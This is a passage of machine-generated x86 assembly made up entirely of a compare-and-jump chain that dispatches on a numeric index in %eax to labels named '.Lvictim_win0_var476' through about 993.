	je	.Lvictim_win0_var476
	cmpl	$477, %eax
	je	.Lvictim_win0_var477
	cmpl	$478, %eax
	je	.Lvictim_win0_var478
	cmpl	$479, %eax
	je	.Lvictim_win0_var479
	cmpl	$480, %eax
	je	.Lvictim_win0_var480
	cmpl	$481, %eax
	je	.Lvictim_win0_var481
	cmpl	$482, %eax
	je	.Lvictim_win0_var482
	cmpl	$483, %eax
	je	.Lvictim_win0_var483
	cmpl	$484, %eax
	je	.Lvictim_win0_var484
	cmpl	$485, %eax
	je	.Lvictim_win0_var485
	cmpl	$486, %eax
	je	.Lvictim_win0_var486
	cmpl	$487, %eax
	je	.Lvictim_win0_var487
	cmpl	$488, %eax
	je	.Lvictim_win0_var488
	cmpl	$489, %eax
	je	.Lvictim_win0_var489
	cmpl	$490, %eax
	je	.Lvictim_win0_var490
	cmpl	$491, %eax
	je	.Lvictim_win0_var491
	cmpl	$492, %eax
	je	.Lvictim_win0_var492
	cmpl	$493, %eax
	je	.Lvictim_win0_var493
	cmpl	$494, %eax
	je	.Lvictim_win0_var494
	cmpl	$495, %eax
	je	.Lvictim_win0_var495
	cmpl	$496, %eax
	je	.Lvictim_win0_var496
	cmpl	$497, %eax
	je	.Lvictim_win0_var497
	cmpl	$498, %eax
	je	.Lvictim_win0_var498
	cmpl	$499, %eax
	je	.Lvictim_win0_var499
	cmpl	$500, %eax
	je	.Lvictim_win0_var500
	cmpl	$501, %eax
	je	.Lvictim_win0_var501
	cmpl	$502, %eax
	je	.Lvictim_win0_var502
	cmpl	$503, %eax
	je	.Lvictim_win0_var503
	cmpl	$504, %eax
	je	.Lvictim_win0_var504
	cmpl	$505, %eax
	je	.Lvictim_win0_var505
	cmpl	$506, %eax
	je	.Lvictim_win0_var506
	cmpl	$507, %eax
	je	.Lvictim_win0_var507
	cmpl	$508, %eax
	je	.Lvictim_win0_var508
	cmpl	$509, %eax
	je	.Lvictim_win0_var509
	cmpl	$510, %eax
	je	.Lvictim_win0_var510
	cmpl	$511, %eax
	je	.Lvictim_win0_var511
	cmpl	$512, %eax
	je	.Lvictim_win0_var512
	cmpl	$513, %eax
	je	.Lvictim_win0_var513
	cmpl	$514, %eax
	je	.Lvictim_win0_var514
	cmpl	$515, %eax
	je	.Lvictim_win0_var515
	cmpl	$516, %eax
	je	.Lvictim_win0_var516
	cmpl	$517, %eax
	je	.Lvictim_win0_var517
	cmpl	$518, %eax
	je	.Lvictim_win0_var518
	cmpl	$519, %eax
	je	.Lvictim_win0_var519
	cmpl	$520, %eax
	je	.Lvictim_win0_var520
	cmpl	$521, %eax
	je	.Lvictim_win0_var521
	cmpl	$522, %eax
	je	.Lvictim_win0_var522
	cmpl	$523, %eax
	je	.Lvictim_win0_var523
	cmpl	$524, %eax
	je	.Lvictim_win0_var524
	cmpl	$525, %eax
	je	.Lvictim_win0_var525
	cmpl	$526, %eax
	je	.Lvictim_win0_var526
	cmpl	$527, %eax
	je	.Lvictim_win0_var527
	cmpl	$528, %eax
	je	.Lvictim_win0_var528
	cmpl	$529, %eax
	je	.Lvictim_win0_var529
	cmpl	$530, %eax
	je	.Lvictim_win0_var530
	cmpl	$531, %eax
	je	.Lvictim_win0_var531
	cmpl	$532, %eax
	je	.Lvictim_win0_var532
	cmpl	$533, %eax
	je	.Lvictim_win0_var533
	cmpl	$534, %eax
	je	.Lvictim_win0_var534
	cmpl	$535, %eax
	je	.Lvictim_win0_var535
	cmpl	$536, %eax
	je	.Lvictim_win0_var536
	cmpl	$537, %eax
	je	.Lvictim_win0_var537
	cmpl	$538, %eax
	je	.Lvictim_win0_var538
	cmpl	$539, %eax
	je	.Lvictim_win0_var539
	cmpl	$540, %eax
	je	.Lvictim_win0_var540
	cmpl	$541, %eax
	je	.Lvictim_win0_var541
	cmpl	$542, %eax
	je	.Lvictim_win0_var542
	cmpl	$543, %eax
	je	.Lvictim_win0_var543
	cmpl	$544, %eax
	je	.Lvictim_win0_var544
	cmpl	$545, %eax
	je	.Lvictim_win0_var545
	cmpl	$546, %eax
	je	.Lvictim_win0_var546
	cmpl	$547, %eax
	je	.Lvictim_win0_var547
	cmpl	$548, %eax
	je	.Lvictim_win0_var548
	cmpl	$549, %eax
	je	.Lvictim_win0_var549
	cmpl	$550, %eax
	je	.Lvictim_win0_var550
	cmpl	$551, %eax
	je	.Lvictim_win0_var551
	cmpl	$552, %eax
	je	.Lvictim_win0_var552
	cmpl	$553, %eax
	je	.Lvictim_win0_var553
	cmpl	$554, %eax
	je	.Lvictim_win0_var554
	cmpl	$555, %eax
	je	.Lvictim_win0_var555
	cmpl	$556, %eax
	je	.Lvictim_win0_var556
	cmpl	$557, %eax
	je	.Lvictim_win0_var557
	cmpl	$558, %eax
	je	.Lvictim_win0_var558
	cmpl	$559, %eax
	je	.Lvictim_win0_var559
	cmpl	$560, %eax
	je	.Lvictim_win0_var560
	cmpl	$561, %eax
	je	.Lvictim_win0_var561
	cmpl	$562, %eax
	je	.Lvictim_win0_var562
	cmpl	$563, %eax
	je	.Lvictim_win0_var563
	cmpl	$564, %eax
	je	.Lvictim_win0_var564
	cmpl	$565, %eax
	je	.Lvictim_win0_var565
	cmpl	$566, %eax
	je	.Lvictim_win0_var566
	cmpl	$567, %eax
	je	.Lvictim_win0_var567
	cmpl	$568, %eax
	je	.Lvictim_win0_var568
	cmpl	$569, %eax
	je	.Lvictim_win0_var569
	cmpl	$570, %eax
	je	.Lvictim_win0_var570
	cmpl	$571, %eax
	je	.Lvictim_win0_var571
	cmpl	$572, %eax
	je	.Lvictim_win0_var572
	cmpl	$573, %eax
	je	.Lvictim_win0_var573
	cmpl	$574, %eax
	je	.Lvictim_win0_var574
	cmpl	$575, %eax
	je	.Lvictim_win0_var575
	cmpl	$576, %eax
	je	.Lvictim_win0_var576
	cmpl	$577, %eax
	je	.Lvictim_win0_var577
	cmpl	$578, %eax
	je	.Lvictim_win0_var578
	cmpl	$579, %eax
	je	.Lvictim_win0_var579
	cmpl	$580, %eax
	je	.Lvictim_win0_var580
	cmpl	$581, %eax
	je	.Lvictim_win0_var581
	cmpl	$582, %eax
	je	.Lvictim_win0_var582
	cmpl	$583, %eax
	je	.Lvictim_win0_var583
	cmpl	$584, %eax
	je	.Lvictim_win0_var584
	cmpl	$585, %eax
	je	.Lvictim_win0_var585
	cmpl	$586, %eax
	je	.Lvictim_win0_var586
	cmpl	$587, %eax
	je	.Lvictim_win0_var587
	cmpl	$588, %eax
	je	.Lvictim_win0_var588
	cmpl	$589, %eax
	je	.Lvictim_win0_var589
	cmpl	$590, %eax
	je	.Lvictim_win0_var590
	cmpl	$591, %eax
	je	.Lvictim_win0_var591
	cmpl	$592, %eax
	je	.Lvictim_win0_var592
	cmpl	$593, %eax
	je	.Lvictim_win0_var593
	cmpl	$594, %eax
	je	.Lvictim_win0_var594
	cmpl	$595, %eax
	je	.Lvictim_win0_var595
	cmpl	$596, %eax
	je	.Lvictim_win0_var596
	cmpl	$597, %eax
	je	.Lvictim_win0_var597
	cmpl	$598, %eax
	je	.Lvictim_win0_var598
	cmpl	$599, %eax
	je	.Lvictim_win0_var599
	cmpl	$600, %eax
	je	.Lvictim_win0_var600
	cmpl	$601, %eax
	je	.Lvictim_win0_var601
	cmpl	$602, %eax
	je	.Lvictim_win0_var602
	cmpl	$603, %eax
	je	.Lvictim_win0_var603
	cmpl	$604, %eax
	je	.Lvictim_win0_var604
	cmpl	$605, %eax
	je	.Lvictim_win0_var605
	cmpl	$606, %eax
	je	.Lvictim_win0_var606
	cmpl	$607, %eax
	je	.Lvictim_win0_var607
	cmpl	$608, %eax
	je	.Lvictim_win0_var608
	cmpl	$609, %eax
	je	.Lvictim_win0_var609
	cmpl	$610, %eax
	je	.Lvictim_win0_var610
	cmpl	$611, %eax
	je	.Lvictim_win0_var611
	cmpl	$612, %eax
	je	.Lvictim_win0_var612
	cmpl	$613, %eax
	je	.Lvictim_win0_var613
	cmpl	$614, %eax
	je	.Lvictim_win0_var614
	cmpl	$615, %eax
	je	.Lvictim_win0_var615
	cmpl	$616, %eax
	je	.Lvictim_win0_var616
	cmpl	$617, %eax
	je	.Lvictim_win0_var617
	cmpl	$618, %eax
	je	.Lvictim_win0_var618
	cmpl	$619, %eax
	je	.Lvictim_win0_var619
	cmpl	$620, %eax
	je	.Lvictim_win0_var620
	cmpl	$621, %eax
	je	.Lvictim_win0_var621
	cmpl	$622, %eax
	je	.Lvictim_win0_var622
	cmpl	$623, %eax
	je	.Lvictim_win0_var623
	cmpl	$624, %eax
	je	.Lvictim_win0_var624
	cmpl	$625, %eax
	je	.Lvictim_win0_var625
	cmpl	$626, %eax
	je	.Lvictim_win0_var626
	cmpl	$627, %eax
	je	.Lvictim_win0_var627
	cmpl	$628, %eax
	je	.Lvictim_win0_var628
	cmpl	$629, %eax
	je	.Lvictim_win0_var629
	cmpl	$630, %eax
	je	.Lvictim_win0_var630
	cmpl	$631, %eax
	je	.Lvictim_win0_var631
	cmpl	$632, %eax
	je	.Lvictim_win0_var632
	cmpl	$633, %eax
	je	.Lvictim_win0_var633
	cmpl	$634, %eax
	je	.Lvictim_win0_var634
	cmpl	$635, %eax
	je	.Lvictim_win0_var635
	cmpl	$636, %eax
	je	.Lvictim_win0_var636
	cmpl	$637, %eax
	je	.Lvictim_win0_var637
	cmpl	$638, %eax
	je	.Lvictim_win0_var638
	cmpl	$639, %eax
	je	.Lvictim_win0_var639
	cmpl	$640, %eax
	je	.Lvictim_win0_var640
	cmpl	$641, %eax
	je	.Lvictim_win0_var641
	cmpl	$642, %eax
	je	.Lvictim_win0_var642
	cmpl	$643, %eax
	je	.Lvictim_win0_var643
	cmpl	$644, %eax
	je	.Lvictim_win0_var644
	cmpl	$645, %eax
	je	.Lvictim_win0_var645
	cmpl	$646, %eax
	je	.Lvictim_win0_var646
	cmpl	$647, %eax
	je	.Lvictim_win0_var647
	cmpl	$648, %eax
	je	.Lvictim_win0_var648
	cmpl	$649, %eax
	je	.Lvictim_win0_var649
	cmpl	$650, %eax
	je	.Lvictim_win0_var650
	cmpl	$651, %eax
	je	.Lvictim_win0_var651
	cmpl	$652, %eax
	je	.Lvictim_win0_var652
	cmpl	$653, %eax
	je	.Lvictim_win0_var653
	cmpl	$654, %eax
	je	.Lvictim_win0_var654
	cmpl	$655, %eax
	je	.Lvictim_win0_var655
	cmpl	$656, %eax
	je	.Lvictim_win0_var656
	cmpl	$657, %eax
	je	.Lvictim_win0_var657
	cmpl	$658, %eax
	je	.Lvictim_win0_var658
	cmpl	$659, %eax
	je	.Lvictim_win0_var659
	cmpl	$660, %eax
	je	.Lvictim_win0_var660
	cmpl	$661, %eax
	je	.Lvictim_win0_var661
	cmpl	$662, %eax
	je	.Lvictim_win0_var662
	cmpl	$663, %eax
	je	.Lvictim_win0_var663
	cmpl	$664, %eax
	je	.Lvictim_win0_var664
	cmpl	$665, %eax
	je	.Lvictim_win0_var665
	cmpl	$666, %eax
	je	.Lvictim_win0_var666
	cmpl	$667, %eax
	je	.Lvictim_win0_var667
	cmpl	$668, %eax
	je	.Lvictim_win0_var668
	cmpl	$669, %eax
	je	.Lvictim_win0_var669
	cmpl	$670, %eax
	je	.Lvictim_win0_var670
	cmpl	$671, %eax
	je	.Lvictim_win0_var671
	cmpl	$672, %eax
	je	.Lvictim_win0_var672
	cmpl	$673, %eax
	je	.Lvictim_win0_var673
	cmpl	$674, %eax
	je	.Lvictim_win0_var674
	cmpl	$675, %eax
	je	.Lvictim_win0_var675
	cmpl	$676, %eax
	je	.Lvictim_win0_var676
	cmpl	$677, %eax
	je	.Lvictim_win0_var677
	cmpl	$678, %eax
	je	.Lvictim_win0_var678
	cmpl	$679, %eax
	je	.Lvictim_win0_var679
	cmpl	$680, %eax
	je	.Lvictim_win0_var680
	cmpl	$681, %eax
	je	.Lvictim_win0_var681
	cmpl	$682, %eax
	je	.Lvictim_win0_var682
	cmpl	$683, %eax
	je	.Lvictim_win0_var683
	cmpl	$684, %eax
	je	.Lvictim_win0_var684
	cmpl	$685, %eax
	je	.Lvictim_win0_var685
	cmpl	$686, %eax
	je	.Lvictim_win0_var686
	cmpl	$687, %eax
	je	.Lvictim_win0_var687
	cmpl	$688, %eax
	je	.Lvictim_win0_var688
	cmpl	$689, %eax
	je	.Lvictim_win0_var689
	cmpl	$690, %eax
	je	.Lvictim_win0_var690
	cmpl	$691, %eax
	je	.Lvictim_win0_var691
	cmpl	$692, %eax
	je	.Lvictim_win0_var692
	cmpl	$693, %eax
	je	.Lvictim_win0_var693
	cmpl	$694, %eax
	je	.Lvictim_win0_var694
	cmpl	$695, %eax
	je	.Lvictim_win0_var695
	cmpl	$696, %eax
	je	.Lvictim_win0_var696
	cmpl	$697, %eax
	je	.Lvictim_win0_var697
	cmpl	$698, %eax
	je	.Lvictim_win0_var698
	cmpl	$699, %eax
	je	.Lvictim_win0_var699
	cmpl	$700, %eax
	je	.Lvictim_win0_var700
	cmpl	$701, %eax
	je	.Lvictim_win0_var701
	cmpl	$702, %eax
	je	.Lvictim_win0_var702
	cmpl	$703, %eax
	je	.Lvictim_win0_var703
	cmpl	$704, %eax
	je	.Lvictim_win0_var704
	cmpl	$705, %eax
	je	.Lvictim_win0_var705
	cmpl	$706, %eax
	je	.Lvictim_win0_var706
	cmpl	$707, %eax
	je	.Lvictim_win0_var707
	cmpl	$708, %eax
	je	.Lvictim_win0_var708
	cmpl	$709, %eax
	je	.Lvictim_win0_var709
	cmpl	$710, %eax
	je	.Lvictim_win0_var710
	cmpl	$711, %eax
	je	.Lvictim_win0_var711
	cmpl	$712, %eax
	je	.Lvictim_win0_var712
	cmpl	$713, %eax
	je	.Lvictim_win0_var713
	cmpl	$714, %eax
	je	.Lvictim_win0_var714
	cmpl	$715, %eax
	je	.Lvictim_win0_var715
	cmpl	$716, %eax
	je	.Lvictim_win0_var716
	cmpl	$717, %eax
	je	.Lvictim_win0_var717
	cmpl	$718, %eax
	je	.Lvictim_win0_var718
	cmpl	$719, %eax
	je	.Lvictim_win0_var719
	cmpl	$720, %eax
	je	.Lvictim_win0_var720
	cmpl	$721, %eax
	je	.Lvictim_win0_var721
	cmpl	$722, %eax
	je	.Lvictim_win0_var722
	cmpl	$723, %eax
	je	.Lvictim_win0_var723
	cmpl	$724, %eax
	je	.Lvictim_win0_var724
	cmpl	$725, %eax
	je	.Lvictim_win0_var725
	cmpl	$726, %eax
	je	.Lvictim_win0_var726
	cmpl	$727, %eax
	je	.Lvictim_win0_var727
	cmpl	$728, %eax
	je	.Lvictim_win0_var728
	cmpl	$729, %eax
	je	.Lvictim_win0_var729
	cmpl	$730, %eax
	je	.Lvictim_win0_var730
	cmpl	$731, %eax
	je	.Lvictim_win0_var731
	cmpl	$732, %eax
	je	.Lvictim_win0_var732
	cmpl	$733, %eax
	je	.Lvictim_win0_var733
	cmpl	$734, %eax
	je	.Lvictim_win0_var734
	cmpl	$735, %eax
	je	.Lvictim_win0_var735
	cmpl	$736, %eax
	je	.Lvictim_win0_var736
	cmpl	$737, %eax
	je	.Lvictim_win0_var737
	cmpl	$738, %eax
	je	.Lvictim_win0_var738
	cmpl	$739, %eax
	je	.Lvictim_win0_var739
	cmpl	$740, %eax
	je	.Lvictim_win0_var740
	cmpl	$741, %eax
	je	.Lvictim_win0_var741
	cmpl	$742, %eax
	je	.Lvictim_win0_var742
	cmpl	$743, %eax
	je	.Lvictim_win0_var743
	cmpl	$744, %eax
	je	.Lvictim_win0_var744
	cmpl	$745, %eax
	je	.Lvictim_win0_var745
	cmpl	$746, %eax
	je	.Lvictim_win0_var746
	cmpl	$747, %eax
	je	.Lvictim_win0_var747
	cmpl	$748, %eax
	je	.Lvictim_win0_var748
	cmpl	$749, %eax
	je	.Lvictim_win0_var749
	cmpl	$750, %eax
	je	.Lvictim_win0_var750
	cmpl	$751, %eax
	je	.Lvictim_win0_var751
	cmpl	$752, %eax
	je	.Lvictim_win0_var752
	cmpl	$753, %eax
	je	.Lvictim_win0_var753
	cmpl	$754, %eax
	je	.Lvictim_win0_var754
	cmpl	$755, %eax
	je	.Lvictim_win0_var755
	cmpl	$756, %eax
	je	.Lvictim_win0_var756
	cmpl	$757, %eax
	je	.Lvictim_win0_var757
	cmpl	$758, %eax
	je	.Lvictim_win0_var758
	cmpl	$759, %eax
	je	.Lvictim_win0_var759
	cmpl	$760, %eax
	je	.Lvictim_win0_var760
	cmpl	$761, %eax
	je	.Lvictim_win0_var761
	cmpl	$762, %eax
	je	.Lvictim_win0_var762
	cmpl	$763, %eax
	je	.Lvictim_win0_var763
	cmpl	$764, %eax
	je	.Lvictim_win0_var764
	cmpl	$765, %eax
	je	.Lvictim_win0_var765
	cmpl	$766, %eax
	je	.Lvictim_win0_var766
	cmpl	$767, %eax
	je	.Lvictim_win0_var767
	cmpl	$768, %eax
	je	.Lvictim_win0_var768
	cmpl	$769, %eax
	je	.Lvictim_win0_var769
	cmpl	$770, %eax
	je	.Lvictim_win0_var770
	cmpl	$771, %eax
	je	.Lvictim_win0_var771
	cmpl	$772, %eax
	je	.Lvictim_win0_var772
	cmpl	$773, %eax
	je	.Lvictim_win0_var773
	cmpl	$774, %eax
	je	.Lvictim_win0_var774
	cmpl	$775, %eax
	je	.Lvictim_win0_var775
	cmpl	$776, %eax
	je	.Lvictim_win0_var776
	cmpl	$777, %eax
	je	.Lvictim_win0_var777
	cmpl	$778, %eax
	je	.Lvictim_win0_var778
	cmpl	$779, %eax
	je	.Lvictim_win0_var779
	cmpl	$780, %eax
	je	.Lvictim_win0_var780
	cmpl	$781, %eax
	je	.Lvictim_win0_var781
	cmpl	$782, %eax
	je	.Lvictim_win0_var782
	cmpl	$783, %eax
	je	.Lvictim_win0_var783
	cmpl	$784, %eax
	je	.Lvictim_win0_var784
	cmpl	$785, %eax
	je	.Lvictim_win0_var785
	cmpl	$786, %eax
	je	.Lvictim_win0_var786
	cmpl	$787, %eax
	je	.Lvictim_win0_var787
	cmpl	$788, %eax
	je	.Lvictim_win0_var788
	cmpl	$789, %eax
	je	.Lvictim_win0_var789
	cmpl	$790, %eax
	je	.Lvictim_win0_var790
	cmpl	$791, %eax
	je	.Lvictim_win0_var791
	cmpl	$792, %eax
	je	.Lvictim_win0_var792
	cmpl	$793, %eax
	je	.Lvictim_win0_var793
	cmpl	$794, %eax
	je	.Lvictim_win0_var794
	cmpl	$795, %eax
	je	.Lvictim_win0_var795
	cmpl	$796, %eax
	je	.Lvictim_win0_var796
	cmpl	$797, %eax
	je	.Lvictim_win0_var797
	cmpl	$798, %eax
	je	.Lvictim_win0_var798
	cmpl	$799, %eax
	je	.Lvictim_win0_var799
	cmpl	$800, %eax
	je	.Lvictim_win0_var800
	cmpl	$801, %eax
	je	.Lvictim_win0_var801
	cmpl	$802, %eax
	je	.Lvictim_win0_var802
	cmpl	$803, %eax
	je	.Lvictim_win0_var803
	cmpl	$804, %eax
	je	.Lvictim_win0_var804
	cmpl	$805, %eax
	je	.Lvictim_win0_var805
	cmpl	$806, %eax
	je	.Lvictim_win0_var806
	cmpl	$807, %eax
	je	.Lvictim_win0_var807
	cmpl	$808, %eax
	je	.Lvictim_win0_var808
	cmpl	$809, %eax
	je	.Lvictim_win0_var809
	cmpl	$810, %eax
	je	.Lvictim_win0_var810
	cmpl	$811, %eax
	je	.Lvictim_win0_var811
	cmpl	$812, %eax
	je	.Lvictim_win0_var812
	cmpl	$813, %eax
	je	.Lvictim_win0_var813
	cmpl	$814, %eax
	je	.Lvictim_win0_var814
	cmpl	$815, %eax
	je	.Lvictim_win0_var815
	cmpl	$816, %eax
	je	.Lvictim_win0_var816
	cmpl	$817, %eax
	je	.Lvictim_win0_var817
	cmpl	$818, %eax
	je	.Lvictim_win0_var818
	cmpl	$819, %eax
	je	.Lvictim_win0_var819
	cmpl	$820, %eax
	je	.Lvictim_win0_var820
	cmpl	$821, %eax
	je	.Lvictim_win0_var821
	cmpl	$822, %eax
	je	.Lvictim_win0_var822
	cmpl	$823, %eax
	je	.Lvictim_win0_var823
	cmpl	$824, %eax
	je	.Lvictim_win0_var824
	cmpl	$825, %eax
	je	.Lvictim_win0_var825
	cmpl	$826, %eax
	je	.Lvictim_win0_var826
	cmpl	$827, %eax
	je	.Lvictim_win0_var827
	cmpl	$828, %eax
	je	.Lvictim_win0_var828
	cmpl	$829, %eax
	je	.Lvictim_win0_var829
	cmpl	$830, %eax
	je	.Lvictim_win0_var830
	cmpl	$831, %eax
	je	.Lvictim_win0_var831
	cmpl	$832, %eax
	je	.Lvictim_win0_var832
	cmpl	$833, %eax
	je	.Lvictim_win0_var833
	cmpl	$834, %eax
	je	.Lvictim_win0_var834
	cmpl	$835, %eax
	je	.Lvictim_win0_var835
	cmpl	$836, %eax
	je	.Lvictim_win0_var836
	cmpl	$837, %eax
	je	.Lvictim_win0_var837
	cmpl	$838, %eax
	je	.Lvictim_win0_var838
	cmpl	$839, %eax
	je	.Lvictim_win0_var839
	cmpl	$840, %eax
	je	.Lvictim_win0_var840
	cmpl	$841, %eax
	je	.Lvictim_win0_var841
	cmpl	$842, %eax
	je	.Lvictim_win0_var842
	cmpl	$843, %eax
	je	.Lvictim_win0_var843
	cmpl	$844, %eax
	je	.Lvictim_win0_var844
	cmpl	$845, %eax
	je	.Lvictim_win0_var845
	cmpl	$846, %eax
	je	.Lvictim_win0_var846
	cmpl	$847, %eax
	je	.Lvictim_win0_var847
	cmpl	$848, %eax
	je	.Lvictim_win0_var848
	cmpl	$849, %eax
	je	.Lvictim_win0_var849
	cmpl	$850, %eax
	je	.Lvictim_win0_var850
	cmpl	$851, %eax
	je	.Lvictim_win0_var851
	cmpl	$852, %eax
	je	.Lvictim_win0_var852
	cmpl	$853, %eax
	je	.Lvictim_win0_var853
	cmpl	$854, %eax
	je	.Lvictim_win0_var854
	cmpl	$855, %eax
	je	.Lvictim_win0_var855
	cmpl	$856, %eax
	je	.Lvictim_win0_var856
	cmpl	$857, %eax
	je	.Lvictim_win0_var857
	cmpl	$858, %eax
	je	.Lvictim_win0_var858
	cmpl	$859, %eax
	je	.Lvictim_win0_var859
	cmpl	$860, %eax
	je	.Lvictim_win0_var860
	cmpl	$861, %eax
	je	.Lvictim_win0_var861
	cmpl	$862, %eax
	je	.Lvictim_win0_var862
	cmpl	$863, %eax
	je	.Lvictim_win0_var863
	cmpl	$864, %eax
	je	.Lvictim_win0_var864
	cmpl	$865, %eax
	je	.Lvictim_win0_var865
	cmpl	$866, %eax
	je	.Lvictim_win0_var866
	cmpl	$867, %eax
	je	.Lvictim_win0_var867
	cmpl	$868, %eax
	je	.Lvictim_win0_var868
	cmpl	$869, %eax
	je	.Lvictim_win0_var869
	cmpl	$870, %eax
	je	.Lvictim_win0_var870
	cmpl	$871, %eax
	je	.Lvictim_win0_var871
	cmpl	$872, %eax
	je	.Lvictim_win0_var872
	cmpl	$873, %eax
	je	.Lvictim_win0_var873
	cmpl	$874, %eax
	je	.Lvictim_win0_var874
	cmpl	$875, %eax
	je	.Lvictim_win0_var875
	cmpl	$876, %eax
	je	.Lvictim_win0_var876
	cmpl	$877, %eax
	je	.Lvictim_win0_var877
	cmpl	$878, %eax
	je	.Lvictim_win0_var878
	cmpl	$879, %eax
	je	.Lvictim_win0_var879
	cmpl	$880, %eax
	je	.Lvictim_win0_var880
	cmpl	$881, %eax
	je	.Lvictim_win0_var881
	cmpl	$882, %eax
	je	.Lvictim_win0_var882
	cmpl	$883, %eax
	je	.Lvictim_win0_var883
	cmpl	$884, %eax
	je	.Lvictim_win0_var884
	cmpl	$885, %eax
	je	.Lvictim_win0_var885
	cmpl	$886, %eax
	je	.Lvictim_win0_var886
	cmpl	$887, %eax
	je	.Lvictim_win0_var887
	cmpl	$888, %eax
	je	.Lvictim_win0_var888
	cmpl	$889, %eax
	je	.Lvictim_win0_var889
	cmpl	$890, %eax
	je	.Lvictim_win0_var890
	cmpl	$891, %eax
	je	.Lvictim_win0_var891
	cmpl	$892, %eax
	je	.Lvictim_win0_var892
	cmpl	$893, %eax
	je	.Lvictim_win0_var893
	cmpl	$894, %eax
	je	.Lvictim_win0_var894
	cmpl	$895, %eax
	je	.Lvictim_win0_var895
	cmpl	$896, %eax
	je	.Lvictim_win0_var896
	cmpl	$897, %eax
	je	.Lvictim_win0_var897
	cmpl	$898, %eax
	je	.Lvictim_win0_var898
	cmpl	$899, %eax
	je	.Lvictim_win0_var899
	cmpl	$900, %eax
	je	.Lvictim_win0_var900
	cmpl	$901, %eax
	je	.Lvictim_win0_var901
	cmpl	$902, %eax
	je	.Lvictim_win0_var902
	cmpl	$903, %eax
	je	.Lvictim_win0_var903
	cmpl	$904, %eax
	je	.Lvictim_win0_var904
	cmpl	$905, %eax
	je	.Lvictim_win0_var905
	cmpl	$906, %eax
	je	.Lvictim_win0_var906
	cmpl	$907, %eax
	je	.Lvictim_win0_var907
	cmpl	$908, %eax
	je	.Lvictim_win0_var908
	cmpl	$909, %eax
	je	.Lvictim_win0_var909
	cmpl	$910, %eax
	je	.Lvictim_win0_var910
	cmpl	$911, %eax
	je	.Lvictim_win0_var911
	cmpl	$912, %eax
	je	.Lvictim_win0_var912
	cmpl	$913, %eax
	je	.Lvictim_win0_var913
	cmpl	$914, %eax
	je	.Lvictim_win0_var914
	cmpl	$915, %eax
	je	.Lvictim_win0_var915
	cmpl	$916, %eax
	je	.Lvictim_win0_var916
	cmpl	$917, %eax
	je	.Lvictim_win0_var917
	cmpl	$918, %eax
	je	.Lvictim_win0_var918
	cmpl	$919, %eax
	je	.Lvictim_win0_var919
	cmpl	$920, %eax
	je	.Lvictim_win0_var920
	cmpl	$921, %eax
	je	.Lvictim_win0_var921
	cmpl	$922, %eax
	je	.Lvictim_win0_var922
	cmpl	$923, %eax
	je	.Lvictim_win0_var923
	cmpl	$924, %eax
	je	.Lvictim_win0_var924
	cmpl	$925, %eax
	je	.Lvictim_win0_var925
	cmpl	$926, %eax
	je	.Lvictim_win0_var926
	cmpl	$927, %eax
	je	.Lvictim_win0_var927
	cmpl	$928, %eax
	je	.Lvictim_win0_var928
	cmpl	$929, %eax
	je	.Lvictim_win0_var929
	cmpl	$930, %eax
	je	.Lvictim_win0_var930
	cmpl	$931, %eax
	je	.Lvictim_win0_var931
	cmpl	$932, %eax
	je	.Lvictim_win0_var932
	cmpl	$933, %eax
	je	.Lvictim_win0_var933
	cmpl	$934, %eax
	je	.Lvictim_win0_var934
	cmpl	$935, %eax
	je	.Lvictim_win0_var935
	cmpl	$936, %eax
	je	.Lvictim_win0_var936
	cmpl	$937, %eax
	je	.Lvictim_win0_var937
	cmpl	$938, %eax
	je	.Lvictim_win0_var938
	cmpl	$939, %eax
	je	.Lvictim_win0_var939
	cmpl	$940, %eax
	je	.Lvictim_win0_var940
	cmpl	$941, %eax
	je	.Lvictim_win0_var941
	cmpl	$942, %eax
	je	.Lvictim_win0_var942
	cmpl	$943, %eax
	je	.Lvictim_win0_var943
	cmpl	$944, %eax
	je	.Lvictim_win0_var944
	cmpl	$945, %eax
	je	.Lvictim_win0_var945
	cmpl	$946, %eax
	je	.Lvictim_win0_var946
	cmpl	$947, %eax
	je	.Lvictim_win0_var947
	cmpl	$948, %eax
	je	.Lvictim_win0_var948
	cmpl	$949, %eax
	je	.Lvictim_win0_var949
	cmpl	$950, %eax
	je	.Lvictim_win0_var950
	cmpl	$951, %eax
	je	.Lvictim_win0_var951
	cmpl	$952, %eax
	je	.Lvictim_win0_var952
	cmpl	$953, %eax
	je	.Lvictim_win0_var953
	cmpl	$954, %eax
	je	.Lvictim_win0_var954
	cmpl	$955, %eax
	je	.Lvictim_win0_var955
	cmpl	$956, %eax
	je	.Lvictim_win0_var956
	cmpl	$957, %eax
	je	.Lvictim_win0_var957
	cmpl	$958, %eax
	je	.Lvictim_win0_var958
	cmpl	$959, %eax
	je	.Lvictim_win0_var959
	cmpl	$960, %eax
	je	.Lvictim_win0_var960
	cmpl	$961, %eax
	je	.Lvictim_win0_var961
	cmpl	$962, %eax
	je	.Lvictim_win0_var962
	cmpl	$963, %eax
	je	.Lvictim_win0_var963
	cmpl	$964, %eax
	je	.Lvictim_win0_var964
	cmpl	$965, %eax
	je	.Lvictim_win0_var965
	cmpl	$966, %eax
	je	.Lvictim_win0_var966
	cmpl	$967, %eax
	je	.Lvictim_win0_var967
	cmpl	$968, %eax
	je	.Lvictim_win0_var968
	cmpl	$969, %eax
	je	.Lvictim_win0_var969
	cmpl	$970, %eax
	je	.Lvictim_win0_var970
	cmpl	$971, %eax
	je	.Lvictim_win0_var971
	cmpl	$972, %eax
	je	.Lvictim_win0_var972
	cmpl	$973, %eax
	je	.Lvictim_win0_var973
	cmpl	$974, %eax
	je	.Lvictim_win0_var974
	cmpl	$975, %eax
	je	.Lvictim_win0_var975
	cmpl	$976, %eax
	je	.Lvictim_win0_var976
	cmpl	$977, %eax
	je	.Lvictim_win0_var977
	cmpl	$978, %eax
	je	.Lvictim_win0_var978
	cmpl	$979, %eax
	je	.Lvictim_win0_var979
	cmpl	$980, %eax
	je	.Lvictim_win0_var980
	cmpl	$981, %eax
	je	.Lvictim_win0_var981
	cmpl	$982, %eax
	je	.Lvictim_win0_var982
	cmpl	$983, %eax
	je	.Lvictim_win0_var983
	cmpl	$984, %eax
	je	.Lvictim_win0_var984
	cmpl	$985, %eax
	je	.Lvictim_win0_var985
	cmpl	$986, %eax
	je	.Lvictim_win0_var986
	cmpl	$987, %eax
	je	.Lvictim_win0_var987
	cmpl	$988, %eax
	je	.Lvictim_win0_var988
	cmpl	$989, %eax
	je	.Lvictim_win0_var989
	cmpl	$990, %eax
	je	.Lvictim_win0_var990
	cmpl	$991, %eax
	je	.Lvictim_win0_var991
	cmpl	$992, %eax
	je	.Lvictim_win0_var992
	cmpl	$993, %eax
